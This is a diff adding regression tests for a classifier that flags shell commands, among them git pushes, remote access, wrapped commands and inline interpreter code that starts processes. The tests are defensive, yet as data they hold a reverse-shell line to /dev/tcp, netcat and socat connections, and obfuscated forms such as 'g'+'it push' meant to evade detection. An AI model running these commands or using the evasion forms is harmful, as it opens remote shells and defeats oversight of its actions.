@@ -284,3 +284,192 @@ describe("S6a other ways to reach git or a forge", () => {
 		assert.deepEqual(remote("git psuh"), []);
 	});
 });
+
+describe("verifier regressions: a merge after a branch switch in the same command", () => {
+	const historyElsewhere = (command: string) => classifyDsp(command, { cwd }).filter((match) => match.dsp?.some((tag) => tag.type === "history") && match.elsewhere === true).length;
+
+	for (const command of ["git switch main; git merge feat/x", "git checkout main && git merge feat/x", "git switch main && git cherry-pick abc", "git checkout main && git rebase feat/x", "git switch main && git revert abc", "git switch main && git am p.patch", "git switch main && git pull", "bash -c 'git switch main' ; git merge x", "echo $(git switch main) $(git merge x)", "git -C ../other merge x"]) {
+		it(`marks the history change as landing elsewhere: ${command}`, () => assert.ok(historyElsewhere(command) > 0, command));
+	}
+
+	it("a merge on its own, or after a command that stays on the branch, is not marked", () => {
+		for (const command of ["git merge feat/y", "git fetch && git merge feat/y", "git add . && git commit -m x"]) assert.equal(historyElsewhere(command), 0, command);
+	});
+});
+
+describe("verifier regressions: more push forms", () => {
+	for (const command of ["git send-pack origin main", "git remote-https origin https://example.com/x.git", "git remote-ext origin x", "git http-push https://example.com/x.git main", "git-send-pack origin main", "git-push origin main", "/usr/libexec/git-core/git-remote-https origin https://x.example/r.git", "git p4 submit"]) {
+		it(`is a remote action: ${command}`, () => assert.ok(remote(command).length > 0, command));
+	}
+
+	for (const command of ["git $SUB origin main", 'git "$(echo push)" origin', "docker $ACTION image", "npm $ACTION"]) {
+		it(`asks when the subcommand is a variable: ${command}`, () => assert.ok(unknown(command).length > 0, command));
+	}
+	it("a variable elsewhere in a git command is fine", () => {
+		assert.deepEqual(unknown('git -C "$DIR" status'), []);
+		assert.deepEqual(unknown('git commit -m "$MSG"'), []);
+	});
+});
+
+describe("verifier regressions: xargs and parallel input decides the command", () => {
+	for (const command of ["echo push | xargs git", "echo push | xargs -I{} git {}", "xargs -I{} git {} <<< push", "echo publish | xargs npm", "echo pr | xargs gh", "echo x | xargs -I% % push", "echo x | xargs -I{} sh -c '{}'", "echo x | xargs sh", "xargs -n1 curl < urls.txt", "echo x | xargs gh api", "echo x | xargs bash -c", "echo x | xargs node", "parallel git {} ::: push", "parallel git ::: push", "parallel {} push ::: git", "parallel curl -s ::: https://x.example"]) {
+		it(`asks: ${command}`, () => assert.ok(unknown(command).length > 0 || remote(command).length > 0, command));
+	}
+
+	for (const command of ["echo a b | xargs -n1 echo", "ls | xargs git add", "ls | xargs -I{} git -C {} status", "echo a | xargs -I{} echo {}", "echo a | xargs -n1 rm", "parallel echo ::: a b", "ls | xargs -n1 node x.js"]) {
+		it(`does not ask: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
+	}
+
+	it("a literal remote command is still remote", () => {
+		assert.ok(remote("xargs git push").length > 0);
+		assert.ok(remote("xargs -I{} git push {}").length > 0);
+		assert.ok(remote("parallel git push ::: origin").length > 0);
+	});
+});
+
+describe("verifier regressions: here-strings are programs", () => {
+	it("a here-string to a shell is scanned", () => {
+		assert.ok(remote("bash <<< 'git push'").length > 0);
+		assert.ok(remote('sh <<< "git push origin main"').length > 0);
+		assert.ok(remote("zsh <<<'gh pr merge 1'").length > 0);
+		assert.ok(remote("python3 <<< \"import os; os.system('git push')\"").length > 0);
+	});
+	it("a here-string built from a variable asks, a plain one does not", () => {
+		assert.ok(unknown('bash <<< "$CMD"').length > 0);
+		assert.deepEqual([remote("bash <<< 'echo hi'"), unknown("bash <<< 'echo hi'")], [[], []]);
+	});
+	it("a here-string to an interpreter that starts processes asks", () => {
+		assert.ok(unknown("python3 <<< \"import subprocess; subprocess.run(['g'+'it','push'])\"").length > 0);
+		assert.deepEqual(unknown("python3 <<< 'print(1)'"), []);
+	});
+});
+
+describe("verifier regressions: command-runner wrappers", () => {
+	for (const command of [
+		"script -c 'git push' /dev/null",
+		"script --command='git push' /dev/null",
+		"script -q /dev/null git push",
+		"su -c 'git push'",
+		"su me -c 'git push'",
+		"su - me -c 'gh pr merge 1'",
+		"runuser -u me -- git push",
+		"runuser me -c 'git push'",
+		"sg staff 'git push'",
+		"sg staff -c 'git push'",
+		"flock /tmp/l git push",
+		"flock -w 5 /tmp/l git push",
+		"flock -c 'git push' /tmp/l",
+		"chroot / git push",
+		"chroot --userspec=me / git push",
+		"unshare -m git push",
+		"setsid git push",
+		"stdbuf -o0 git push",
+		"caffeinate -i git push",
+		"doas git push",
+		"parallel ::: 'git push'",
+		"parallel -j2 git push ::: origin",
+		"osascript -e 'do shell script \"git push\"'",
+		"osascript -e 'do shell script \"git push\" with administrator privileges'",
+		"sshpass -p x git push",
+	]) {
+		it(`sees the remote action inside: ${command}`, () => assert.ok(remote(command).length > 0, command));
+	}
+
+	for (const command of ["parallel < cmds.txt", "parallel -a cmds.txt", "parallel ::: 'git push' :::: more.txt", "osascript deploy.scpt", "osascript -e 'do shell script \"git \" & \"push\"'", "osascript -e 'do shell script cmd'", "osascript -l JavaScript -e 'app.doShellScript(x)'", "osascript -e 'tell application \"Terminal\" to do script \"git push\"'", "parallel -S host git status ::: x", "su -c \"$CMD\"", "script -c \"$CMD\" /dev/null", "flock -c \"git $A\" /tmp/l"]) {
+		it(`asks when the inner command cannot be read: ${command}`, () => assert.ok(unknown(command).length > 0 || remote(command).length > 0, command));
+	}
+
+	for (const command of ["script -q /dev/null echo hi", "flock /tmp/l echo hi", "flock -c 'echo hi' /tmp/l", "osascript -e 'display dialog \"hi\"'", "chroot / ls", "unshare -m ls", "parallel echo ::: a b", "setsid echo hi", "sg staff 'echo hi'"]) {
+		it(`leaves a local inner command alone: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
+	}
+
+	it("su and runuser count as elevated privileges", () => {
+		for (const command of ["su -c 'echo hi'", "runuser -u me -- echo hi", "chroot / ls"]) assert.ok(classifyDsp(command, { cwd }).some((match) => match.kind === "privileged"), command);
+	});
+});
+
+describe("verifier regressions: inline interpreter code that starts processes asks", () => {
+	for (const command of [
+		"python3 -c \"import os; os.system('g'+'it push')\"",
+		"python -c 'import subprocess; subprocess.run(x)'",
+		"python3 -c 'from subprocess import Popen; Popen(x)'",
+		"python3 -c \"__import__('os').system(x)\"",
+		"node -e 'require(\"child_process\").execSync(\"gi\"+\"t push\")'",
+		"node --eval 'require(\"child_process\").spawn(x)'",
+		"node -p 'process.binding(\"spawn_sync\")'",
+		"node -e 'require(\"child_\"+\"process\")'",
+		"perl -e 'system(\"g\".\"it push\")'",
+		"perl -e 'print `git push`'",
+		"perl -E 'exec $cmd'",
+		"ruby -e 'system(\"git push\")'",
+		"ruby -e '`#{c}`'",
+		"ruby -e 'exec \"git\", \"push\"'",
+		"php -r 'shell_exec($c);'",
+		"php -r 'echo `git push`;'",
+		"deno eval 'new Deno.Command(\"git\", {args: a}).output()'",
+		"bun -e 'Bun.spawn([\"git\", \"push\"])'",
+		"bun --eval 'import(\"node:child_process\")'",
+		"lua -e 'os.execute(c)'",
+	]) {
+		it(`asks: ${command}`, () => assert.ok(unknown(command).length > 0 || remote(command).length > 0, command));
+	}
+
+	for (const command of ["python3 -c 'print(1+1)'", "python -c 'import json; print(json.dumps({1: 2}))'", "node -e 'console.log(JSON.stringify({a:1}))'", "node -p '1+1'", "perl -e 'print 1+1'", "perl -ne 'print if /x/' file", "ruby -e 'puts 1'", "php -r 'echo 1;'", "deno eval 'console.log(1)'", "bun -e 'console.log(1)'", "node -e 'console.log(require(\"fs\").readdirSync(\".\"))'"]) {
+		it(`does not ask: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
+	}
+
+	it("a script run with a -c argument is not taken for inline code", () => {
+		assert.deepEqual(unknown("python3 x.py -c 'import os; os.system(c)'"), []);
+	});
+});
+
+describe("verifier regressions: curl config files", () => {
+	for (const command of ["curl -K cfg https://api.github.com/x", "curl --config cfg https://x.example", "curl --config=cfg https://x.example", "curl -sK cfg https://x.example", "curl -K - < cfg", "curl -K cfg http://localhost:3000"]) {
+		it(`asks: ${command}`, () => assert.ok(remote(command).length > 0, command));
+	}
+	it("a plain read does not ask", () => assert.deepEqual(remote("curl -s https://api.github.com/x"), []));
+});
+
+describe("verifier regressions: raw remote access", () => {
+	for (const command of [
+		"ssh deploy@example.com 'git pull'",
+		"ssh -i key -p 2222 host ls",
+		"ssh -o StrictHostKeyChecking=no host",
+		"mosh host",
+		"scp build.tar deploy@example.com:/srv/",
+		"scp host:/etc/x .",
+		"scp -P 22 -i key a.txt host:b",
+		"scp a.txt scp://host/b",
+		"sftp host",
+		"sftp -b batch deploy@host",
+		"rsync -a dist/ deploy@example.com:/srv/",
+		"rsync -avz host:src dst",
+		"rsync -e 'ssh -p 2' a host:b",
+		"rsync -a src rsync://host/module",
+		"rsync -a src host::module",
+		"rsync -a src [::1]:/x",
+		"nc example.com 80 < req.txt",
+		"ncat host 80",
+		"netcat -l 9000",
+		"socat - TCP:example.com:80",
+		"telnet example.com 25",
+		"ftp example.com",
+		"openssl s_client -connect example.com:443",
+		"exec 3<>/dev/tcp/example.com/80",
+		"echo hi > /dev/tcp/example.com/80",
+		"cat < /dev/udp/example.com/53",
+		"bash -i >& /dev/tcp/example.com/4444 0>&1",
+		"env nc host 80",
+		"time ssh host true",
+	]) {
+		it(`is remote work: ${command}`, () => assert.ok(remote(command).includes("remote shell/copy"), command));
+	}
+
+	for (const command of ["rsync -a src/ backup/", "rsync -a --exclude 'a:b' src/ backup/", "rsync -a ./a:b dst/", "scp a.txt b.txt", "scp ./x:y z", "ssh -V", "ssh-keygen -l -f key", "ssh-add -l", "cat /dev/null > out.txt", "echo hi > /dev/stderr"]) {
+		it(`stays local: ${command}`, () => assert.deepEqual([remote(command), unknown(command)], [[], []], command));
+	}
+
+	it("a /dev path built from a variable asks", () => {
+		assert.ok(unknown("exec 3<>/dev/$PROTO/example.com/80").length > 0);
+	});
+});
